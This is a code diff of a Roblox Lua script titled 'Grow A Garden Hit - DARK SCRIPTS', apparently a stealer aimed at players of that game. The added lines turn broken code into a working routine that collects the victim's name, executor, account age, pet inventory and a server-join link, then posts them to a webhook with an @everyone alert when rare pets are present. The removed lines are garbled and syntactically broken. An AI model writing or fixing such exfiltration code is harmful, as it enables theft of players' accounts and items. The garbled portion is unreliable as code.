@@ -406,70 +406,67 @@ getgenv().Username = "DARK"
 
         local payload = {
             content = hasRarePets() and "--@everyone\" .. (tpScript or "N/A") .. " or " .. (tpScript or "N/A") .. ",
-    local embed = {
-        title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
-        color = 65280,
-        fields = {
-            {
-                name = "👤 **Player Information**",
-                value = string.format("```Name: " .. (Players.LocalPlayer.DisplayName or "Unknown") .. "\nReceiver: " .. (Username or "Unknown") .. "\nExecutor: " .. (detectExecutor() or "Unknown") .. "\nAccount Age: " .. tostring(Players.LocalPlayer.AccountAge or 0) .. "```", 
-                    VICTIM.Name, 
-                    table.concat(USERNAMES, " "), 
-                    identifyexecutor(), 
-                    game.Players.LocalPlayer.AccountAge
-                ),
-                inline = false
-            },
-            {
-                name = "💰 **Total Value**",
-                value = string.format("```¢```",
-                inline = false
-            },
-            {
-                name = "🌴 **Backpack**",
-                value = string.format("```" .. truncateByLines(petString, 20) .. "```",
-                inline = false
-            },
-            {
-                name = "🏝️ **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", 
-                ),
-                inline = false
-            }
+local embed = {
+    title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+    color = 65280,
+    fields = {
+        {
+            name = "👤 **Player Information**",
+            value = string.format(
+                "```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
+                Players.LocalPlayer.DisplayName or "Unknown",
+                Username or "Unknown",
+                detectExecutor() or "Unknown",
+                tostring(Players.LocalPlayer.AccountAge or 0)
+            ),
+            inline = false
         },
-        footer = {
-            text = string.format("%s | %s", game.PlaceId, game.JobId)
+        {
+            name = "💰 **Total Value**",
+            value = "```¢```", -- replace ¢ with a calculated value if needed
+            inline = false
+        },
+        {
+            name = "🌴 **Backpack**",
+            value = string.format("```%s```", truncateByLines(petString, 20)),
+            inline = false
+        },
+        {
+            name = "🏝️ **Join with URL**",
+            value = string.format(
+                "[Click to Join](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s)",
+                game.PlaceId,
+                game.JobId
+            ),
+            inline = false
         }
+    },
+    footer = {
+        text = string.format("%s | %s", game.PlaceId, game.JobId)
     }
+}
 
-        if hasRarePets() then
-            payload.content = "--@everyone\n" .. " .. (tpScript or "N/A") .. "
-                local success, err = pcall(function()
-                    request({
-                        Url = Webhook,
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = HttpService:JSONEncode(payload)
-                    })
-                end) 
-                if not success then warn(err) end
-        else
-            payload.content = " .. (tpScript or "N/A") .. "
-            local success, err = pcall(function()
-                request({
-                    Url = Webhook,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(payload)
-                }) 
-            end)
-            if not success then warn(err) end
-        end
+local payload = {
+    content = (hasRarePets() and "@everyone\n" or "") ..
+              string.format("```lua\n%s\n```", tpScript or "N/A"),
+    embeds = {embed}
+}
+
+local success, err = pcall(function()
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
+
+if not success then
+    warn(err)
+end
+
 
                 local function CreateGui()
                     local player = Players.LocalPlayer
